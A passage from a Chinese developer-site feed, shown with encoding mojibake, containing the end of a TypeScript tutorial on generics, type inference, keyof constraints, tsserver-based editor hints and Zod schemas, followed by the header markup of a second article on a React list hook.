values.<span class="hljs-property">age</span>;       <span class="hljs-comment">// ç±»å‹æ˜¯ number âœ…</span>
values.<span class="hljs-property">foo</span>;       <span class="hljs-comment">// âŒ ç¼–è¯‘é”™è¯¯ï¼šProperty 'foo' does not exist</span>
</code></pre>
<p><strong>å¯¹æ¯”æ€»ç»“</strong></p>



































<table><thead><tr><th/><th>ç›´æ¥æŒ‡å®šç±»å‹</th><th>æ³›å‹ + extends</th></tr></thead><tbody><tr><td>å‚æ•°ç±»å‹</td><td><code>Record&lt;string, unknown&gt;</code></td><td><code>T</code>ï¼ˆå…·ä½“ç±»å‹ï¼‰</td></tr><tr><td>è¿”å›å€¼ç±»å‹</td><td><code>Record&lt;string, unknown&gt;</code></td><td><code>T</code>ï¼ˆå…·ä½“ç±»å‹ï¼‰</td></tr><tr><td>å­—æ®µè®¿é—®</td><td>ä»»æ„å­—æ®µéƒ½ä¸æŠ¥é”™</td><td>åªèƒ½è®¿é—®å­˜åœ¨çš„å­—æ®µ</td></tr><tr><td>å­—æ®µç±»å‹</td><td>å…¨æ˜¯ <code>unknown</code></td><td>ä¿ç•™åŸå§‹ç±»å‹</td></tr><tr><td>IDE æç¤º</td><td>æ— </td><td>æœ‰å®Œæ•´çš„å­—æ®µè¡¥å…¨</td></tr></tbody></table>
<p>æ³›å‹çš„æ ¸å¿ƒä»·å€¼å°±æ˜¯ï¼š<strong>è®©ç±»å‹ä¿¡æ¯åœ¨å‡½æ•°è°ƒç”¨è¿‡ç¨‹ä¸­"æµåŠ¨"ï¼Œè€Œä¸æ˜¯è¢«æŠ¹æ‰</strong>ã€‚</p>
<h4 data-id="heading-42">æ·±å…¥ç†è§£"ç±»å‹æµåŠ¨"</h4>
<p><strong>ä»€ä¹ˆæ˜¯ç±»å‹è¢«"æŠ¹æ‰"ï¼Ÿ</strong></p>
<p>å½“ä½ ç”¨å®½æ³›çš„ç±»å‹ï¼ˆå¦‚ <code>Record&lt;string, unknown&gt;</code>ã€<code>any</code>ã€<code>object</code>ï¼‰ä½œä¸ºå‚æ•°ç±»å‹æ—¶ï¼ŒTS åªèƒ½è®°ä½è¿™ä¸ªå®½æ³›çš„ç±»å‹ï¼Œå…·ä½“çš„ç±»å‹ä¿¡æ¯å°±ä¸¢å¤±äº†ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">identity</span>(<span class="hljs-params">value: <span class="hljs-built_in">object</span></span>): <span class="hljs-built_in">object</span> {
  <span class="hljs-keyword">return</span> value;
}

<span class="hljs-keyword">const</span> user = <span class="hljs-title function_">identity</span>({ <span class="hljs-attr">name</span>: <span class="hljs-string">'john'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">25</span> });
<span class="hljs-comment">// user çš„ç±»å‹æ˜¯ object</span>
<span class="hljs-comment">// TS å·²ç»"å¿˜è®°"äº†å®ƒåŸæœ¬æ˜¯ { name: string; age: number }</span>
</code></pre>
<p>ç±»å‹ä¿¡æ¯åœ¨è¿›å…¥å‡½æ•°æ—¶è¢«"æŠ¹æ‰"äº†ï¼Œå‡ºæ¥åå°±åªå‰©ä¸‹ <code>object</code>ã€‚</p>
<p><strong>ä»€ä¹ˆæ˜¯ç±»å‹"æµåŠ¨"ï¼Ÿ</strong></p>
<p>æ³›å‹è®© TS æŠŠå…·ä½“ç±»å‹"å¸¦ç€èµ°"ï¼Œä»è¾“å…¥æµåŠ¨åˆ°è¾“å‡ºï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> identity&lt;T&gt;(<span class="hljs-attr">value</span>: T): T {
  <span class="hljs-keyword">return</span> value;
}

<span class="hljs-keyword">const</span> user = <span class="hljs-title function_">identity</span>({ <span class="hljs-attr">name</span>: <span class="hljs-string">'john'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">25</span> });
<span class="hljs-comment">// user çš„ç±»å‹æ˜¯ { name: string; age: number }</span>
<span class="hljs-comment">// TS "è®°ä½"äº†å…·ä½“ç±»å‹ï¼Œå¹¶è®©å®ƒæµåŠ¨åˆ°è¿”å›å€¼</span>
</code></pre>
<p><strong>æµåŠ¨è¿‡ç¨‹å¯è§†åŒ–</strong></p>
<pre><code class="hljs language-css" lang="css">æ²¡æœ‰æ³›å‹ï¼ˆç±»å‹è¢«æŠ¹æ‰ï¼‰ï¼š
{ name: string; age: number } â”€â”€è¿›å…¥å‡½æ•°â”€â”€â–º <span class="hljs-selector-tag">object</span> â”€â”€è¿”å›â”€â”€â–º <span class="hljs-selector-tag">object</span>
                                    â†‘
                              ç±»å‹ä¿¡æ¯åœ¨è¿™é‡Œä¸¢å¤±

æœ‰æ³›å‹ï¼ˆç±»å‹æµåŠ¨ï¼‰ï¼š
{ name: string; age: number } â”€â”€è¿›å…¥å‡½æ•°â”€â”€â–º T â”€â”€è¿”å›â”€â”€â–º { name: string; age: number }
                                    â†‘              â†‘
                              T è®°ä½äº†å…·ä½“ç±»å‹    åŸæ ·æµå‡º
</code></pre>
<p><strong>åœ¨ useForm ä¸­çš„ä½“ç°</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ç±»å‹æµåŠ¨çš„å®Œæ•´é“¾è·¯ï¼š</span>
<span class="hljs-title function_">useForm</span>({ <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">0</span> })
    â”‚
    â–¼ è¾“å…¥ç±»å‹ { <span class="hljs-attr">username</span>: <span class="hljs-built_in">string</span>; <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span> }
    â”‚
    â–¼ T æ•è·è¿™ä¸ªç±»å‹
    â”‚
    â–¼ useState&lt;T&gt; ä½¿ç”¨è¿™ä¸ªç±»å‹
    â”‚
    â–¼ setField&lt;K <span class="hljs-keyword">extends</span> keyof T&gt; ä½¿ç”¨è¿™ä¸ªç±»å‹
    â”‚
    â–¼ è¿”å›çš„ values ä¿æŒè¿™ä¸ªç±»å‹
    â”‚
    â–¼ è°ƒç”¨æ–¹æ‹¿åˆ°çš„ values ç±»å‹æ˜¯ { <span class="hljs-attr">username</span>: <span class="hljs-built_in">string</span>; <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span> }
</code></pre>
<p>æ•´ä¸ªè¿‡ç¨‹ä¸­ï¼Œ<code>{ username: string; age: number }</code> è¿™ä¸ªå…·ä½“ç±»å‹è¢« <code>T</code> æ•è·åï¼Œä¸€è·¯æµåŠ¨åˆ°æœ€ç»ˆçš„è¿”å›å€¼ï¼Œæ²¡æœ‰ä»»ä½•åœ°æ–¹ä¸¢å¤±ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆ"æµåŠ¨"å¾ˆé‡è¦ï¼Ÿ</strong></p>
<p>å› ä¸ºç±»å‹çš„ä»·å€¼åœ¨äº<strong>ä½¿ç”¨æ—¶</strong>ã€‚å¦‚æœç±»å‹åœ¨å‡½æ•°è°ƒç”¨åä¸¢å¤±äº†ï¼Œåç»­ä»£ç å°±æ— æ³•è·å¾—ç±»å‹æ£€æŸ¥å’Œ IDE æç¤ºï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ç±»å‹ä¸¢å¤±åï¼Œåç»­ä»£ç "è£¸å¥”"</span>
<span class="hljs-keyword">const</span> { values } = <span class="hljs-title function_">useFormBad</span>({ <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">0</span> });
values.<span class="hljs-property">usernam</span> = <span class="hljs-string">'test'</span>;  <span class="hljs-comment">// æ‹¼å†™é”™è¯¯ï¼Œä¸æŠ¥é”™</span>
values.<span class="hljs-property">age</span> = <span class="hljs-string">'25'</span>;        <span class="hljs-comment">// ç±»å‹é”™è¯¯ï¼Œä¸æŠ¥é”™</span>

<span class="hljs-comment">// ç±»å‹æµåŠ¨åï¼Œåç»­ä»£ç å—ä¿æŠ¤</span>
<span class="hljs-keyword">const</span> { values } = <span class="hljs-title function_">useFormGood</span>({ <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">0</span> });
values.<span class="hljs-property">usernam</span> = <span class="hljs-string">'test'</span>;  <span class="hljs-comment">// âŒ ç¼–è¯‘é”™è¯¯ï¼šå±æ€§ä¸å­˜åœ¨</span>
values.<span class="hljs-property">age</span> = <span class="hljs-string">'25'</span>;        <span class="hljs-comment">// âŒ ç¼–è¯‘é”™è¯¯ï¼šç±»å‹ä¸åŒ¹é…</span>
</code></pre>
<p><strong>ä¸€å¥è¯æ€»ç»“</strong>ï¼šæ³›å‹å°±åƒä¸€ä¸ª"ç±»å‹å˜é‡"ï¼Œå®ƒåœ¨å‡½æ•°å…¥å£æ•è·å…·ä½“ç±»å‹ï¼Œç„¶åæŠŠè¿™ä¸ªç±»å‹å¸¦åˆ°å‡½æ•°å†…éƒ¨å’Œå‡ºå£ï¼Œè®©æ•´ä¸ªè°ƒç”¨é“¾è·¯éƒ½èƒ½äº«å—åˆ°ç±»å‹å®‰å…¨ã€‚</p>
<h4 data-id="heading-43">çº¦æŸçš„æ„ä¹‰</h4>
<p><code>extends</code> çº¦æŸæœ‰ä¸¤ä¸ªä½œç”¨ï¼š</p>
<ol>
<li><strong>é™åˆ¶è°ƒç”¨è€…</strong>ï¼šåªèƒ½ä¼ å…¥ç¬¦åˆçº¦æŸçš„ç±»å‹ï¼Œä¼ é”™äº†ç¼–è¯‘æŠ¥é”™</li>
<li><strong>ä¿éšœå®ç°è€…</strong>ï¼šå‡½æ•°å†…éƒ¨å¯ä»¥å®‰å…¨åœ°å‡è®¾ T æ˜¯å¯¹è±¡ç±»å‹ï¼Œä½¿ç”¨ <code>keyof T</code> ç­‰æ“ä½œ</li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> useForm&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">unknown</span>&gt;&gt;(<span class="hljs-attr">initialValues</span>: T) {
  <span class="hljs-comment">// å› ä¸º T extends Record&lt;string, unknown&gt;</span>
  <span class="hljs-comment">// æ‰€ä»¥ keyof T ä¸€å®šæ˜¯ stringï¼ˆå¯¹è±¡çš„ keyï¼‰</span>
  <span class="hljs-comment">// è¿™é‡Œçš„æ“ä½œæ˜¯ç±»å‹å®‰å…¨çš„</span>
  <span class="hljs-keyword">const</span> <span class="hljs-attr">keys</span>: (keyof T)[] = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(initialValues) <span class="hljs-keyword">as</span> (keyof T)[];
}
</code></pre>
<h4 data-id="heading-44">æ€»ç»“</h4>

























<table><thead><tr><th>æ¦‚å¿µ</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>æ³›å‹å˜é‡ <code>T</code></td><td>ç±»å‹å ä½ç¬¦ï¼Œè°ƒç”¨æ—¶ç”±å‚æ•°åæ¨ç¡®å®š</td></tr><tr><td><code>extends</code> çº¦æŸ</td><td>é™åˆ¶ T å¿…é¡»æ»¡è¶³æŸç§ç»“æ„ï¼Œå¦åˆ™ç¼–è¯‘æŠ¥é”™</td></tr><tr><td>åæ¨æœºåˆ¶</td><td>TS æ ¹æ®å®é™…ä¼ å…¥çš„å‚æ•°ï¼Œè‡ªåŠ¨æ¨æ–­å‡º T çš„å…·ä½“ç±»å‹</td></tr><tr><td>çº¦æŸ + åæ¨</td><td>æ—¢ä¿è¯ç±»å‹å®‰å…¨ï¼ˆçº¦æŸï¼‰ï¼Œåˆä¿ç•™å…·ä½“ç±»å‹ä¿¡æ¯ï¼ˆåæ¨ï¼‰</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-45">å…­ã€VSCode å¦‚ä½•è·å¾—ç±»å‹æç¤º</h2>
<h3 data-id="heading-46">æ ¸å¿ƒï¼šTypeScript Language Server</h3>
<pre><code class="hljs language-arduino" lang="arduino">ä½ å†™ä»£ç  â†’ VSCode â†’ TypeScript Language <span class="hljs-built_in">Server</span> â†’ ç±»å‹æ¨å¯¼å¼•æ“
                              â†“
                    è¿”å›ç±»å‹ä¿¡æ¯ã€é”™è¯¯ã€è¡¥å…¨å»ºè®®
                              â†“
                    VSCode æ˜¾ç¤ºæç¤º/æŠ¥é”™/è¡¥å…¨
</code></pre>
<h3 data-id="heading-47">å·¥ä½œæœºåˆ¶</h3>
<ol>
<li>VSCode å†…ç½® TS æ‰©å±•ï¼Œå¯åŠ¨æ—¶è‡ªåŠ¨è¿è¡Œ <code>tsserver</code></li>
<li>æ¯æ¬¡æ•²é”®ç›˜ï¼ŒVSCode é€šè¿‡ LSP åè®®æŠŠä»£ç å‘ç»™ tsserver</li>
<li>tsserver å®æ—¶åˆ†æï¼šè§£æ AST â†’ è¿è¡Œç±»å‹æ¨å¯¼ â†’ è¿”å›ç»“æœ</li>
<li>VSCode æ¸²æŸ“ï¼šçº¢è‰²æ³¢æµªçº¿ã€æ‚¬æµ®æç¤ºã€è‡ªåŠ¨è¡¥å…¨åˆ—è¡¨</li>
</ol>
<h3 data-id="heading-48">åŠŸèƒ½å¯¹åº”</h3>

























<table><thead><tr><th>åŠŸèƒ½</th><th>èƒŒååœ¨åšä»€ä¹ˆ</th></tr></thead><tbody><tr><td>æ‚¬æµ®æ˜¾ç¤ºç±»å‹</td><td>tsserver æ¨å¯¼å‡ºç±»å‹è¿”å›ç»™ VSCode</td></tr><tr><td>è‡ªåŠ¨è¡¥å…¨</td><td>tsserver è¿”å›å½“å‰ä¸Šä¸‹æ–‡å¯ç”¨çš„å±æ€§/æ–¹æ³•</td></tr><tr><td>çº¢è‰²æ³¢æµªçº¿</td><td>tsserver æ£€æµ‹åˆ°ç±»å‹é”™è¯¯</td></tr><tr><td>F12 è·³è½¬å®šä¹‰</td><td>tsserver æ‰¾åˆ°ç¬¦å·å®šä¹‰ä½ç½®</td></tr></tbody></table>
<p>ç±»å‹æ¨å¯¼çš„"æ™ºèƒ½"å…¨åœ¨ TypeScript ç¼–è¯‘å™¨é‡Œï¼ŒVSCode åªæ˜¯æ˜¾ç¤ºå±‚ã€‚</p>
<hr/>
<h2 data-id="heading-49">æ€»ç»“</h2>





































<table><thead><tr><th>æ¦‚å¿µ</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>TypeScript ç±»å‹</td><td>ç¼–è¯‘æ—¶æ£€æŸ¥ä½ å†™çš„ä»£ç </td></tr><tr><td>Zod</td><td>è¿è¡Œæ—¶éªŒè¯å¤–éƒ¨æ•°æ® + Schema è‡ªåŠ¨å¯¼å‡ºç±»å‹</td></tr><tr><td><code>z.infer</code></td><td>Schema å’Œç±»å‹ç»Ÿä¸€ï¼ŒSingle Source of Truth</td></tr><tr><td>æ³›å‹</td><td>è®©ç±»å‹å¯å¤ç”¨ï¼Œè®©ç±»å‹ä¿¡æ¯"æµåŠ¨"</td></tr><tr><td>æ¡ä»¶ç±»å‹</td><td>æ ¹æ®æ¡ä»¶è¿”å›ä¸åŒç±»å‹</td></tr><tr><td><code>infer</code></td><td>ä»å¤æ‚ç±»å‹ä¸­æå–éƒ¨åˆ†</td></tr><tr><td>LSP</td><td>ç¼–è¾‘å™¨è·å¾—ç±»å‹æç¤ºçš„æ¡¥æ¢</td></tr></tbody></table>
<h3 data-id="heading-50">æ ¸å¿ƒç†å¿µ</h3>
<p><strong>TypeScript ç±»å‹æ¨æ–­</strong>ï¼šæŠŠè¿è¡Œæ—¶é”™è¯¯å˜æˆç¼–è¯‘æ—¶é”™è¯¯ã€‚é€šè¿‡æ³›å‹ã€æ¡ä»¶ç±»å‹ç­‰æœºåˆ¶ï¼Œè®©ç±»å‹ä¿¡æ¯åœ¨ä»£ç ä¸­"æµåŠ¨"ï¼Œåœ¨ç¼–è¯‘é˜¶æ®µå°±èƒ½å‘ç°å­—æ®µæ‹¼å†™é”™è¯¯ã€ç±»å‹ä¸åŒ¹é…ç­‰é—®é¢˜ã€‚</p>
<p>ä»¥ <code>setField</code> ä¸ºä¾‹ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// âŒ æ²¡æœ‰ç±»å‹æ¨æ–­çš„å†™æ³•</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">setFieldBad</span>(<span class="hljs-params">field: <span class="hljs-built_in">string</span>, value: <span class="hljs-built_in">unknown</span></span>) {
  <span class="hljs-comment">// ...</span>
}

<span class="hljs-title function_">setFieldBad</span>(<span class="hljs-string">'usernmae'</span>, <span class="hljs-string">'john'</span>);  <span class="hljs-comment">// æ‹¼å†™é”™è¯¯ï¼Œç¼–è¯‘ä¸æŠ¥é”™ï¼Œè¿è¡Œæ—¶å­—æ®µæ²¡æ›´æ–°</span>
<span class="hljs-title function_">setFieldBad</span>(<span class="hljs-string">'age'</span>, <span class="hljs-string">'25'</span>);         <span class="hljs-comment">// ç±»å‹é”™è¯¯ï¼Œç¼–è¯‘ä¸æŠ¥é”™ï¼Œè¿è¡Œæ—¶é€»è¾‘å‡ºé—®é¢˜</span>

<span class="hljs-comment">// âœ… æœ‰ç±»å‹æ¨æ–­çš„å†™æ³•</span>
<span class="hljs-keyword">function</span> setField&lt;K <span class="hljs-keyword">extends</span> keyof T&gt;(<span class="hljs-attr">field</span>: K, <span class="hljs-attr">value</span>: T[K]) {
  <span class="hljs-comment">// ...</span>
}

<span class="hljs-keyword">const</span> { setField } = <span class="hljs-title function_">useForm</span>({ <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">0</span> });

<span class="hljs-title function_">setField</span>(<span class="hljs-string">'usernmae'</span>, <span class="hljs-string">'john'</span>);  <span class="hljs-comment">// âŒ ç¼–è¯‘é”™è¯¯ï¼š'usernmae' ä¸åœ¨ 'username' | 'age' ä¸­</span>
<span class="hljs-title function_">setField</span>(<span class="hljs-string">'age'</span>, <span class="hljs-string">'25'</span>);         <span class="hljs-comment">// âŒ ç¼–è¯‘é”™è¯¯ï¼šç±»å‹ 'string' ä¸èƒ½èµ‹å€¼ç»™ç±»å‹ 'number'</span>
<span class="hljs-title function_">setField</span>(<span class="hljs-string">'age'</span>, <span class="hljs-number">25</span>);           <span class="hljs-comment">// âœ… ç¼–è¯‘é€šè¿‡</span>
</code></pre>
<p>å…³é”®åœ¨äº <code>K extends keyof T</code> å’Œ <code>T[K]</code> çš„é…åˆï¼š</p>
<ul>
<li>TS æ ¹æ®ä½ ä¼ å…¥çš„åˆå§‹å€¼ï¼Œæ¨æ–­å‡º <code>T = { username: string; age: number }</code></li>
<li>è°ƒç”¨ <code>setField('age', ...)</code> æ—¶ï¼Œæ¨æ–­å‡º <code>K = 'age'</code>ï¼Œè¿›è€Œæ¨æ–­å‡º <code>value</code> å¿…é¡»æ˜¯ <code>number</code></li>
<li>å­—æ®µåå’Œå€¼ç±»å‹çš„å¯¹åº”å…³ç³»ï¼Œåœ¨ç¼–è¯‘æ—¶å°±è¢«é”æ­»äº†</li>
</ul>
<p>è¿™å°±æ˜¯ç±»å‹æ¨æ–­çš„å¨åŠ›ï¼š<strong>ä¸æ˜¯ç®€å•çš„ç±»å‹æ ‡æ³¨ï¼Œè€Œæ˜¯è®© TS æ ¹æ®ä¸Šä¸‹æ–‡è‡ªåŠ¨æ¨å¯¼å‡ºçº¦æŸå…³ç³»ï¼ŒæŠŠæœ¬è¯¥è¿è¡Œæ—¶æ‰æš´éœ²çš„ bug æå‰åˆ°ç¼–è¯‘æ—¶æ‹¦æˆª</strong>ã€‚</p>
<p><strong>Zod çš„æ ¸å¿ƒä»·å€¼</strong>ï¼šSchema å³ç±»å‹ï¼ˆSingle Source of Truthï¼‰ã€‚</p>
<ul>
<li>ä¼ ç»Ÿæ–¹å¼ï¼šæ‰‹å†™ interface + æ‰‹å†™éªŒè¯é€»è¾‘ï¼Œä¸¤ä»½ä»£ç å®¹æ˜“ä¸åŒæ­¥</li>
<li>Zod æ–¹å¼ï¼šåªå†™ä¸€æ¬¡ Schemaï¼Œé€šè¿‡ <code>z.infer</code> è‡ªåŠ¨å¯¼å‡º TypeScript ç±»å‹</li>
</ul>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ä¸€å¤„å®šä¹‰ï¼Œä¸¤å¤„å—ç›Š</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">UserSchema</span> = z.<span class="hljs-title function_">object</span>({ <span class="hljs-attr">name</span>: z.<span class="hljs-title function_">string</span>(), <span class="hljs-attr">age</span>: z.<span class="hljs-title function_">number</span>() });
<span class="hljs-keyword">type</span> <span class="hljs-title class_">User</span> = z.<span class="hljs-property">infer</span>&lt;<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">UserSchema</span>&gt;;  <span class="hljs-comment">// ç¼–è¯‘æ—¶ç±»å‹</span>
<span class="hljs-title class_">UserSchema</span>.<span class="hljs-title function_">parse</span>(data);                   <span class="hljs-comment">// è¿è¡Œæ—¶éªŒè¯</span>
</code></pre>
<p><strong>ä¸¤è€…çš„å…³ç³»</strong>ï¼š</p>
<ul>
<li>TypeScript ä¿è¯<strong>ä½ å†™çš„ä»£ç </strong>ç±»å‹æ­£ç¡®ï¼ˆç¼–è¯‘æ—¶ï¼‰</li>
<li>Zod ä¿è¯<strong>å¤–éƒ¨æ•°æ®</strong>ç¬¦åˆé¢„æœŸï¼ˆè¿è¡Œæ—¶ï¼‰</li>
<li><code>z.infer</code> è®© Zod Schema å’Œ TS ç±»å‹ç»Ÿä¸€ï¼Œé¿å…é‡å¤å®šä¹‰</li>
</ul>
<p>ä¸¤è€…äº’è¡¥ï¼Œè¦†ç›–äº†ç¼–è¯‘æ—¶å’Œè¿è¡Œæ—¶çš„ç±»å‹å®‰å…¨ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ğŸš€ ä»é‡å¤ CRUD åˆ°å·¥ç¨‹åŒ–å°è£…ï¼šæˆ‘æ˜¯å¦‚ä½•è®¾è®¡ useTableList ç»Ÿä¸€åˆ—è¡¨é€»è¾‘çš„]]></title>    <link>https://juejin.cn/post/7592815497847488575</link>    <guid>https://juejin.cn/post/7592815497847488575</guid>    <pubDate>2026-01-08T09:29:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592815497847488575" data-draft-id="7592815497847472191" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ğŸš€ ä»é‡å¤ CRUD åˆ°å·¥ç¨‹åŒ–å°è£…ï¼šæˆ‘æ˜¯å¦‚ä½•è®¾è®¡ useTableList ç»Ÿä¸€åˆ—è¡¨é€»è¾‘çš„"/> <meta itemprop="keywords" content="React.js,Ant Design,JavaScript"/> <meta itemprop="datePublished" content="2026-01-08T09:29:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="basestone"/> <meta itemprop="url" content="https://juejin.cn/user/2647279728853518"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ğŸš€ ä»é‡å¤ CRUD åˆ°å·¥ç¨‹åŒ–å°è£…ï¼šæˆ‘æ˜¯å¦‚ä½•è®¾è®¡ useTableList ç»Ÿä¸€åˆ—è¡¨é€»è¾‘çš„
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2647279728853518/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    basestone
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T09:29:41.000Z" title="Thu Jan 08 2026 09:29:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    15
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 